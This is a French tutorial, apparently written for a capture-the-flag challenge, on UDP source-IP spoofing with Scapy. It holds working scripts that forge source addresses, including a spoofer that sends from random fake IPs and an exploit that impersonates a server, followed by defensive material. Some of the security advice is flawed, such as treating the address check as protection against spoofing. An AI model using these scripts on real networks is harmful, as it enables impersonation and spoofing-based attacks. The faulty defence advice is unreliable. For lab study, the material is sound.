# UDP Spoofing avec Scapy - Guide Complet

Guide détaillé sur le UDP spoofing, les différences TCP/UDP, et comment utiliser Scapy pour des attaques.

---

## Table des matières

1. [Introduction UDP vs TCP](#introduction-udp-vs-tcp)
2. [Qu'est-ce que le UDP Spoofing](#quest-ce-que-le-udp-spoofing)
3. [La bibliothèque Scapy](#la-bibliothèque-scapy)
4. [Concepts fondamentaux](#concepts-fondamentaux)
5. [Code pratique](#code-pratique)
6. [Le challenge UDP](#le-challenge-udp)
7. [Sécurité et défenses](#sécurité-et-défenses)

---

## Introduction: UDP vs TCP

### TCP (Transmission Control Protocol)

```python
import socket

# TCP = Fiable, connecté, séquentiel

# Client TCP:
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#                                 └─ SOCK_STREAM = TCP
s.connect(("server", 80))  # ◄─── 3-way handshake
s.send(b"Hello")
s.close()

# Caractéristiques TCP:
├─ Connexion obligatoire (3-way handshake)
├─ Données ordonnées (séquence)
├─ Retransmission si perdu
├─ Fiable mais lent
└─ Chaque paquet a une raison d'être
```

### UDP (User Datagram Protocol)

```python
import socket

# UDP = Non fiable, sans connexion, rapide

# Client UDP:
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#                                 └─ SOCK_DGRAM = UDP
s.sendto(b"Hello", ("server", 53))  # ◄─── Pas de connexion !
# PAS DE CONNECT !

# Caractéristiques UDP:
├─ Pas de connexion (pas de handshake)
├─ Données non ordonnées (peuvent arriver désordonnées)
├─ Pas de retransmission (données perdues = perdues)
├─ Non fiable mais très rapide
├─ Chaque paquet est envoyé "tel quel"
└─ Pas de suivi de session
```

### Tableau comparatif

```
Aspect              TCP                 UDP
────────────────────────────────────────────────
Connexion           Requise ✓           Pas requise ✗
Fiabilité           Garantie ✓          Meilleure effort ✗
Ordre                Garanti ✓          Non garanti ✗
Vitesse              Lent                Rapide ✓
Overhead            Élevé               Bas ✓
Retransmission      Automatique ✓       Aucune ✗
Vérification        Checksum ✓          Checksum ✓
Application         HTTP, SSH, FTP      DNS, VoIP, Gaming
```

---

## Qu'est-ce que le UDP Spoofing

### Le problème fondamental de UDP

UDP n'a **PAS de mécanisme de vérification d'identité**.

```
TCP (fiable):
┌──────────────────────────────────┐
│ 3-way handshake:                 │
│                                  │
│ Client → [SYN]                   │
│         Serveur                  │
│         ← [SYN-ACK]              │
│ Client → [ACK]                   │
│                                  │
│ Résultat: Identité vérifiée ✓    │
└──────────────────────────────────┘

UDP (non fiable):
┌──────────────────────────────────┐
│ Client → [Données]               │
│         Serveur                  │
│                                  │
│ Pas de handshake !               │
│ Serveur accepte n'importe quoi   │
│ Pas de vérification ✗            │
└──────────────────────────────────┘
```

### Le UDP Spoofing

**Spoofing** = "Usurper" l'identité de quelqu'un d'autre

```python
# UDP Spoofing = Envoyer un paquet UDP
# en prétendant venir d'une IP différente

# Exemple:
# Tu es 10.0.0.1
# Mais tu envoies un paquet qui dit:
# "Je viens de 192.168.1.100"

# Le serveur reçoit:
# Source: 192.168.1.100 (FAUX !)
# Destinataire: 10.0.0.2
# Données: "Hello"

# Serveur pense que c'est 192.168.1.100 qui envoie
# Mais c'est toi (10.0.0.1) !
```

### Pourquoi UDP Spoofing est dangereux

```
1. Pas de vérification d'identité
   ├─ TCP: Handshake vérifie
   └─ UDP: Rien à vérifier

2. Le serveur accepte n'importe quelle source
   ├─ Données viennent de X?
   ├─ UDP dit: "OK, j'y crois"
   └─ Pas de validation

3. Peut être utilisé pour des attaques
   ├─ DNS spoofing (changer les réponses DNS)
   ├─ IP spoofing (se faire passer pour quelqu'un d'autre)
   ├─ DDoS amplification (rediriger les réponses)
   └─ Session confusion (important pour ton challenge)
```

---

## La bibliothèque Scapy

### Qu'est-ce que Scapy ?

Scapy est une **bibliothèque de manipulation de paquets réseau**.

```
Scapy = "Outil pour créer/modifier/envoyer des paquets bruts"

Avant Scapy:
├─ Sockets = niveau bas
└─ Besoin de gérer les bits et bytes manuellement

Avec Scapy:
├─ Couches abstraites (IP, TCP, UDP, etc.)
├─ Facile de modifier les paquets
└─ Puissant pour les tests de sécurité
```

### Installation

```bash
# Installer Scapy
pip install scapy --break-system-packages
# ou si pip échoue
sudo apt-get install python3-scapy
```

### Vérifier l'installation

```python
from scapy.all import *

print(IP)  # ◄─── Doit fonctionner
print(UDP)
print(TCP)
```

---

## Concepts fondamentaux

### 1. Les couches réseau (OSI Model)

```
Couche 7: Application (HTTP, DNS, SSH)
Couche 6: Présentation (Chiffrement, compression)
Couche 5: Session (Gestion session)
Couche 4: Transport (TCP, UDP) ◄─── Nous sommes ici
Couche 3: Réseau (IP) ◄─── Et ici
Couche 2: Liaison (Ethernet, MAC)
Couche 1: Physique (Câbles, ondes)

Scapy permet de manipuler les couches 2-7
```

### 2. Structure d'un paquet UDP

```
┌─────────────────────────────────────────┐
│ Couche 2: Ethernet (MAC)                │
├─────────────────────────────────────────┤
│ Couche 3: IP                            │
│  ├─ Source IP: 192.168.1.100            │
│  ├─ Destination IP: 10.0.0.2            │
│  ├─ TTL: 64                             │
│  └─ Checksum IP                         │
├─────────────────────────────────────────┤
│ Couche 4: UDP                           │
│  ├─ Source Port: 12345                  │
│  ├─ Destination Port: 53                │
│  ├─ Longueur: 8 bytes (header)          │
│  └─ Checksum UDP                        │
├─────────────────────────────────────────┤
│ Couche 7: Données (Payload)             │
│  └─ "Hello, World!"                     │
└─────────────────────────────────────────┘

Avec Scapy:
Paquet = Ethernet() / IP() / UDP() / Raw()
```

### 3. Construction d'un paquet avec Scapy

```python
from scapy.all import IP, UDP, Raw, send

# Créer un paquet UDP

paquet = IP(dst="10.0.0.2", src="192.168.1.100") / UDP(dport=53, sport=12345) / Raw(load="Hello")
#        │                                       │                          │
#        └─ Couche IP                            └─ Couche UDP             └─ Données

# Visualiser le paquet
paquet.show()
# Output:
# ###[ IP ]###
#   version   = 4
#   ihl       = None
#   tos       = 0x0
#   len       = None
#   id        = 1
#   flags     = 
#   frag      = 0
#   ttl       = 64
#   proto     = udp
#   chksum    = None (sera calculé automatiquement)
#   src       = 192.168.1.100
#   dst       = 10.0.0.2
# ###[ UDP ]###
#   sport     = 12345
#   dport     = 53
#   len       = None
#   chksum    = None (sera calculé automatiquement)
# ###[ Raw ]###
#   load      = 'Hello'

# Envoyer le paquet
send(paquet)
# ◄─── Paquet envoyé !

# Note: Besoin de droits root pour envoyer des paquets bruts
```

---

## Code pratique

### Exemple 1: Envoyer un simple paquet UDP

```python
#!/usr/bin/env python3
"""
Exemple simple: Envoyer un paquet UDP avec Scapy
"""

from scapy.all import IP, UDP, Raw, send

print("[*] Création d'un paquet UDP")

# Créer le paquet
paquet = IP(dst="10.0.0.2", src="10.0.0.1") / UDP(dport=31337, sport=12345) / Raw(load="Hello, Server!")

print("[*] Paquet créé:")
paquet.show()

print("\n[*] Envoi du paquet...")
send(paquet, verbose=1)  # ◄─── verbose=1 montre le paquet envoyé

print("[*] Paquet envoyé !")
```

**Exécuter:**

```bash
sudo python3 udp_simple.py
```

### Exemple 2: UDP Spoofing - Changer l'adresse source

```python
#!/usr/bin/env python3
"""
UDP Spoofing: Envoyer un paquet en prétendant venir d'ailleurs
"""

from scapy.all import IP, UDP, Raw, send
import time

print("[*] UDP Spoofing - Changer l'adresse source")
print()

# Scénario:
# Tu es 10.0.0.1
# Mais tu envoies des paquets qui semblent venir de 192.168.1.100

fake_source = "192.168.1.100"  # ◄─── IP FAUSSE
real_destination = "10.0.0.2"  # ◄─── Vraie cible

print(f"[*] Adresse source réelle: 10.0.0.1")
print(f"[*] Adresse source simulée: {fake_source}")
print(f"[*] Destination réelle: {real_destination}")
print()

# Créer et envoyer 5 paquets
for i in range(5):
    # Créer le paquet avec FAUSSE source
    paquet = IP(
        dst=real_destination,
        src=fake_source  # ◄─── SPOOFING ! Pas notre vraie IP
    ) / UDP(
        dport=53,  # Port DNS
        sport=12345
    ) / Raw(
        load=f"Spoofed packet #{i+1}"
    )
    
    print(f"[+] Envoi paquet {i+1}...")
    send(paquet, verbose=0)
    time.sleep(0.5)

print("[*] Tous les paquets envoyés !")
print("[*] Le serveur pense qu'ils viennent de 192.168.1.100")
print("[*] Mais c'est toi (10.0.0.1) qui les envoies !")
```

**Exécuter:**

```bash
sudo python3 udp_spoofing.py
```

### Exemple 3: UDP Spoofing avancé

```python
#!/usr/bin/env python3
"""
UDP Spoofing avancé: Simuler une source différente pour chaque paquet
"""

from scapy.all import IP, UDP, Raw, send
import random

class UDPSpoofer:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.packets_sent = 0
    
    def spoof_from_ip(self, fake_source_ip, data, verbose=False):
        """
        Envoyer un paquet UDP en prétendant venir d'une autre IP
        
        Args:
            fake_source_ip: IP source simulée
            data: Données à envoyer
            verbose: Afficher les détails
        """
        # Créer le paquet
        paquet = IP(
            dst=self.target_ip,
            src=fake_source_ip  # ◄─── SPOOFED source
        ) / UDP(
            dport=self.target_port,
            sport=random.randint(10000, 60000)  # ◄─── Port aléatoire
        ) / Raw(
            load=data
        )
        
        # Envoyer
        try:
            send(paquet, verbose=0)
            self.packets_sent += 1
            
            if verbose:
                print(f"[+] Paquet envoyé de {fake_source_ip} → {self.target_ip}:{self.target_port}")
        
        except Exception as e:
            print(f"[-] Erreur: {e}")
    
    def spoof_multiple_sources(self, num_packets):
        """
        Envoyer des paquets depuis plusieurs sources différentes
        """
        print(f"[*] Envoi de {num_packets} paquets spoofés")
        print(f"[*] Cible: {self.target_ip}:{self.target_port}")
        print()
        
        for i in range(num_packets):
            # Générer une fausse IP source à chaque fois
            fake_ip = f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"
            data = f"Spoofed packet #{i+1} from {fake_ip}"
            
            self.spoof_from_ip(fake_ip, data, verbose=True)
        
        print()
        print(f"[*] Total paquets envoyés: {self.packets_sent}")


# Utilisation
if __name__ == "__main__":
    spoofer = UDPSpoofer("10.0.0.2", 31337)
    spoofer.spoof_multiple_sources(10)
```

**Exécuter:**

```bash
sudo python3 udp_spoofer_advanced.py
```

---

## Le challenge UDP

### Comprendre le challenge

```
"Dans ce défi, un côté de la connexion peut confondre une connexion 
non fiable avec une connexion fiable et imprimer l'indicateur."
```

**Ça signifie:**

```
1. Il y a un serveur UDP
2. Il y a un client UDP
3. Le client pense que les paquets viennent d'une certaine source
4. Mais grâce au spoofing, on peut envoyer des paquets d'une autre source
5. Le client "confond" et pense que c'est une connexion fiable
6. Il affiche le flag
```

### Exemple hypothétique du challenge

```python
# Serveur (attente de paquets)
server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_socket.bind(("0.0.0.0", 31337))

data, addr = server_socket.recvfrom(1024)
# addr = (IP_source, port_source)
# Mais on ne peut pas vérifier si c'est vraiment cette IP !

# Client (envoi de paquets)
# Attend des paquets d'une source spécifique
# Si on envoie des paquets spoofés de la bonne "source"
# Le client pense qu'c'est fiable et affiche le flag
```

### Code pour exploiter le challenge

```python
#!/usr/bin/env python3
"""
Challenge UDP: Exploiter la confusion entre fiable et non-fiable
"""

from scapy.all import IP, UDP, Raw, send
import time

print("[*] ════════════════════════════════════════════════════")
print("[*] Challenge UDP - Confusion Fiable/Non-fiable")
print("[*] ════════════════════════════════════════════════════")
print()

print("[*] Scénario:")
print("[*] 1. Il y a un CLIENT UDP qui écoute")
print("[*] 2. Le CLIENT attend des paquets d'un serveur")
print("[*] 3. Si on envoie les paquets de la bonne 'source'")
print("[*] 4. Le CLIENT pense qu'c'est une connexion TCP-like")
print("[*] 5. Le CLIENT affiche le FLAG")
print()

# Hypothèse: 
# - Serveur écoute sur 10.0.0.2:31337
# - Client s'attend à recevoir de 10.0.0.2
# - Mais on peut spoofer et envoyer de n'importe où

target_server = "10.0.0.2"
target_port = 31337

print("[*] Tentative 1: Envoyer des paquets spoofés")
print(f"[*] Prétendre venir de {target_server}")
print()

# Envoyer des paquets qui semblent venir du serveur
# Mais avec un contenu spécifique

for i in range(10):
    # Créer un paquet qui semble venir du serveur
    paquet = IP(
        dst="10.0.0.3",  # Client attend ici
        src=target_server  # ◄─── Spoofer comme si c'était le serveur
    ) / UDP(
        dport=31337,
        sport=31337
    ) / Raw(
        load=f"Message {i+1} from server"
    )
    
    print(f"[+] Envoi paquet spoofé {i+1}...")
    send(paquet, verbose=0)
    time.sleep(0.1)

print()
print("[*] Paquets spoofés envoyés !")
print("[*] Si le client est configuré pour accepter n'importe quelle source")
print("[*] Il peut être "confus" et accepter ces paquets comme valides")
print("[*] FLAG DEVRAIT S'AFFICHER !")
```

---

## Sécurité et défenses

### Pourquoi UDP Spoofing est possible

```python
# UDP = Sans état = Sans vérification

# Contrairement à TCP:
# TCP (3-way handshake):
# ├─ Client → SYN(seq=1000)
# ├─ Serveur → SYN-ACK(seq=2000, ack=1001)
# ├─ Client → ACK(ack=2001)
# └─ Vérification d'identité complète ✓

# UDP = Pas de handshake:
# Client → Données
# ◄─── Pas de vérification !
```

### Défenses contre UDP Spoofing

#### 1. Ingress/Egress Filtering

```
Bloquer les paquets UDP avec une source non-routable

Exemple:
├─ Paquet dit: "Je viens de 192.168.1.100"
├─ Mais je reçois sur l'interface 10.0.0.0/24
├─ 192.168.1.100 ne peut pas être sur 10.0.0.0/24
└─ Rejeter le paquet ✓
```

#### 2. Vérification au niveau application

```python
# Mauvais (vulnérable):
data, addr = socket.recvfrom(1024)
# addr = adresse source (peut être spoofée)
traiter_data(data)  # ◄─── Accepte n'importe quoi

# Bon (sécurisé):
data, addr = socket.recvfrom(1024)
ip_source, port_source = addr

# Vérifier que la source est autorisée
authorized_sources = ["10.0.0.2", "10.0.0.5"]
if ip_source not in authorized_sources:
    rejeter_paquet()  # ◄─── Rejeter les spoofés
traiter_data(data)
```

#### 3. Signatures cryptographiques

```python
# Mauvais (UDP simple):
socket.sendto(b"Données", addr)
# N'importe qui peut envoyer

# Bon (avec HMAC):
import hmac
import hashlib

secret = b"shared_secret_key"
data = b"Données"

# Créer une signature
signature = hmac.new(secret, data, hashlib.sha256).digest()

# Envoyer données + signature
socket.sendto(data + signature, addr)

# À la réception:
received_data = received[:len(data)]
received_sig = received[len(data):]

# Vérifier la signature
expected_sig = hmac.new(secret, received_data, hashlib.sha256).digest()
if received_sig == expected_sig:
    # Données authentiques ✓
    traiter_data(received_data)
else:
    # Données spoofées ou corrompues ✗
    rejeter_paquet()
```

#### 4. Numérotation de séquence (comme TCP)

```python
# Implémenter un numéro de séquence

sequence_number = 0

def send_udp_reliable(data):
    global sequence_number
    paquet = f"{sequence_number}:{data}"
    socket.sendto(paquet.encode(), addr)
    sequence_number += 1

# À la réception:
expected_seq = 0

def receive_udp_reliable():
    global expected_seq
    data = socket.recvfrom(1024)[0].decode()
    seq, payload = data.split(":", 1)
    seq = int(seq)
    
    if seq != expected_seq:
        # Paquet spoofé ou désordre
        rejeter_paquet()
    
    expected_seq += 1
    return payload
```

---

## Résumé des concepts

```
UDP Spoofing:
├─ Possible car UDP n'a pas de vérification d'identité
├─ Utilisé dans:
│  ├─ DNS spoofing (réponses DNS fausses)
│  ├─ DDoS amplification (rediriger les réponses)
│  ├─ IP spoofing (se faire passer pour quelqu'un)
│  └─ Session confusion (ton challenge)
│
├─ Défenses:
│  ├─ Ingress/Egress filtering
│  ├─ Vérification application-level
│  ├─ Signatures cryptographiques
│  └─ Numérotation de séquence
│
└─ Scapy:
   ├─ Outil puissant pour créer des paquets
   ├─ IP() / UDP() / Raw()
   ├─ send() pour envoyer
   └─ Besoin de droits root (sudo)
```

---

## Commandes Scapy essentielles

```python
from scapy.all import *

# Créer un paquet
paquet = IP(dst="10.0.0.2", src="10.0.0.1") / UDP(dport=53) / Raw(load="Data")

# Visualiser
paquet.show()

# Envoyer
send(paquet)  # Envoyer et oublier
send(paquet, verbose=1)  # Afficher les détails

# Envoyer et recevoir
result = sr(paquet)  # Envoyer et recevoir (TCP)
result = sr1(paquet)  # Envoyer et recevoir 1 réponse

# Modifier un paquet
paquet[IP].ttl = 32
paquet[UDP].dport = 80

# Accéder à une couche
ip_layer = paquet[IP]
udp_layer = paquet[UDP]

# Créer une pile complète
complete_packet = Ether() / IP() / UDP() / Raw()
```

---

## Résumé final

**UDP Spoofing = Envoyer des paquets UDP en prétendant venir d'ailleurs**

**Scapy = Outil pour créer et envoyer ces paquets**

**Pour ton challenge:**
1. Comprendre que UDP n'a pas de vérification
2. Utiliser Scapy pour créer des paquets spoofés
3. Envoyer vers la cible
4. Le client sera "confus" si configuré incorrectement
5. Flag s'affiche

**Next: Appliquer cela au challenge spécifique** 🚀
